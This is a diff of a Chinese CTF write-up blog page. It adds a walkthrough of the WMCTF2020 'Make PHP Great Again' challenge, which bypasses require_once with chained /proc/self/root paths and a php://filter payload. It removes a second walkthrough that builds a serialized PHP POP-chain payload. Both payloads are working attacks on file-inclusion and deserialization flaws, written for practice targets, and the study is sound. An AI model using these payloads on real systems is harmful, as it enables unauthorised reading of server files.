@@ -69,6 +69,50 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-WMCTF2020-Make-PHP-Great-Again" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/02/09/WMCTF2020-Make-PHP-Great-Again/" class="article-date">
+  <time class="dt-published" datetime="2025-02-09T12:53:34.000Z" itemprop="datePublished">2025-02-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/02/09/WMCTF2020-Make-PHP-Great-Again/">[WMCTF2020]Make PHP Great Again</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>打开后看到一小段代码<br>&lt;?php<br>highlight_file(<strong>FILE</strong>);<br>require_once ‘flag.php’;<br>if(isset($_GET[‘file’])) {<br>  require_once $_GET[‘file’];<br>}</p>
+<p>这里出现了require_once<br>require_once 表达式和 require 表达式完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。</p>
+<p>由于 require_once 包含的软链接层数较多时 once 的 hash 匹配会直接失效造成重复包含。</p>
+<p>由于已经包含过一次了，接下来就是绕过once再包含一次</p>
+<p>&#x2F;proc&#x2F;self&#x2F;是指向当前进程的&#x2F;proc&#x2F;pid&#x2F;，而&#x2F;proc&#x2F;self&#x2F;root是指向&#x2F;的软连接，所以让软连接层数变多即可造成重复包含：<br>&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p>
+<p>在url中输入便得到PD9waHAKCiRmbGFnID0gJ2ZsYWd7NjVkZDVhOTEtYzhlZC00Y2JiLWJhNjgtMGM3ODVjZTE1YTdhfSc7Cg&#x3D;&#x3D;<br>解码便可得到flag。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/02/09/WMCTF2020-Make-PHP-Great-Again/" data-id="cm6xmv56t0000qcx17a6p1jfm" data-title="[WMCTF2020]Make PHP Great Again" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-红明谷CTF-2021-write-shell" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/02/09/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/" class="article-date">
@@ -573,85 +617,6 @@ if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
 
 
   
-    <article id="post-题1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/01/19/%E9%A2%981/" class="article-date">
-  <time class="dt-published" datetime="2025-01-19T12:29:04.000Z" itemprop="datePublished">2025-01-19</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/01/19/%E9%A2%981/">题1</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>首先先打开靶机，发现有几段代码。<br>Welcome to index.php<br>&lt;?php<br>&#x2F;&#x2F;flag is in flag.php<br>&#x2F;&#x2F;WTF IS THIS?<br>&#x2F;&#x2F;Learn From <a target="_blank" rel="noopener" href="https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95">https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</a><br>&#x2F;&#x2F;And Crack It!<br>class Modifier {<br>    protected  $var;<br>    public function append($value){<br>        include($value);<br>    }<br>    public function __invoke(){<br>        $this-&gt;append($this-&gt;var);<br>    }<br>}</p>
-<p>class Show{<br>    public $source;<br>    public $str;<br>    public function __construct($file&#x3D;’index.php’){<br>        $this-&gt;source &#x3D; $file;<br>        echo ‘Welcome to ‘.$this-&gt;source.”<br>“;<br>    }<br>    public function __toString(){<br>        return $this-&gt;str-&gt;source;<br>    }</p>
-<pre><code>public function __wakeup()&#123;
-    if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;
-        echo &quot;hacker&quot;;
-        $this-&gt;source = &quot;index.php&quot;;
-    &#125;
-&#125;
-</code></pre>
-<p>}</p>
-<p>class Test{<br>    public $p;<br>    public function __construct(){<br>        $this-&gt;p &#x3D; array();<br>    }</p>
-<pre><code>public function __get($key)&#123;
-    $function = $this-&gt;p;
-    return $function();
-&#125;
-</code></pre>
-<p>}</p>
-<p>if(isset($_GET[‘pop’])){<br>    @unserialize($_GET[‘pop’]);<br>}<br>else{<br>    $a&#x3D;new Show;<br>    highlight_file(<strong>FILE</strong>);<br>}<br>根据题目pop和代码内容可知这是考查反序列化的。</p>
-<p>由这个可知flag包含在flag.php中。再往后是三个类Modifier、show、test。先了解一些反序列化的魔法方法<br>__construct()&#x2F;&#x2F;当一个对象创建时被调用<br>__destruct() &#x2F;&#x2F;当一个对象销毁时被调用<br>__toString() &#x2F;&#x2F;当一个对象被当作一个字符串使用<br>__sleep()&#x2F;&#x2F;在对象在被序列化之前运行<br>__wakeup()&#x2F;&#x2F;将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)<br>__get()&#x2F;&#x2F;获得一个类的成员变量时调用<br>__set()&#x2F;&#x2F;设置一个类的成员变量时调用<br>__invoke()&#x2F;&#x2F;调用函数的方式调用一个对象时的回应方法<br>__call()&#x2F;&#x2F;当调用一个对象中的不能用的方法的时候就会执行这个函数<br>还要补充一个基础的知识，-&gt;是php中的运算符。<br>先分析第一段。<br>class Modifier {<br>    protected  $var;<br>    public function append($value){<br>        include($value);<br>    }<br>    public function __invoke(){<br>        $this-&gt;append($this-&gt;var);<br>    }<br>}</p>
-<p>有魔法方法_invoke（当调用一个对象中的不能用的方法的时候就会执行这个函数），此处应用php伪协议来调用flag.php。<br>$var&#x3D;”php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php”<br>再看第二段<br>class Show{<br>    public $source;<br>    public $str;<br>    public function __construct($file&#x3D;’index.php’){<br>        $this-&gt;source &#x3D; $file;<br>        echo ‘Welcome to ‘.$this-&gt;source.”<br>“;<br>    }<br>    public function __toString(){<br>        return $this-&gt;str-&gt;source;<br>    }</p>
-<pre><code>public function __wakeup()&#123;
-    if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;
-        echo &quot;hacker&quot;;
-        $this-&gt;source = &quot;index.php&quot;;
-    &#125;
-&#125;
-</code></pre>
-<p>}<br>出现_toString()(当一个对象被当作一个字符串使用),和黑名单_wakeup. 给$str赋值为对象Test，而Test中不存在成员属性source，则可以触发Test里面的成员方法__get给；$source赋值为对象Show，当成字符串被echo调用，触发toString。<br>看第三段<br>class Test{<br>    public $p;<br>    public function __construct(){<br>        $this-&gt;p &#x3D; array();<br>    }</p>
-<pre><code>public function __get($key)&#123;
-    $function = $this-&gt;p;
-    return $function();
-&#125;
-</code></pre>
-<p>}<br>有_get()(获得一个类的成员变量时调用), 给$p赋值为对象，即function成为对象Modifier却被当成函数调用，触发Modifier中的invoke.<br>最终思路</p>
-<p>1.调用include()函数，让Test类中的属性p等于Modifier这个类，从而触发__get()魔术方法<br>将Modifier这个类变成一个函数，从而调用__invoke()方法，进而调用include()函数<br>2.让source 等于对象，进而触发__toString方法，输出内容。<br>最后的exp为<br>并得到序列化后的内容为<br>O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BN%3B%7D%7D</p>
-<p>然后在url中输入传参，便得到一串代码，放到SKR中解码得到flag。<br><?php
-class Flag{
-    private $flag= "flag{9c3e90cd-e4b5-4230-887c-18efcfcaf3b4}";
-}
-echo "Help Me Find FLAG!";
-?></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/19/%E9%A2%981/" data-id="cm63lhrkb0000igx13g8fh4kf" data-title="题1" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -688,6 +653,10 @@ echo "Help Me Find FLAG!";
       <ul>
         
           <li>
+            <a href="/2025/02/09/WMCTF2020-Make-PHP-Great-Again/">[WMCTF2020]Make PHP Great Again</a>
+          </li>
+        
+          <li>
             <a href="/2025/02/09/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/">[红明谷CTF 2021]write_shell</a>
           </li>
         
@@ -701,10 +670,6 @@ echo "Help Me Find FLAG!";
         
           <li>
             <a href="/2025/02/02/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php-1/">[安洵杯 2019]easy_serialize_php 1</a>
-          </li>
-        
-          <li>
-            <a href="/2025/02/01/%E2%80%98%E3%80%90%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0WAF%E7%BB%95%E8%BF%87%E3%80%91%E2%80%99/">‘【文件上传WAF绕过】’</a>
           </li>
         
       </ul>
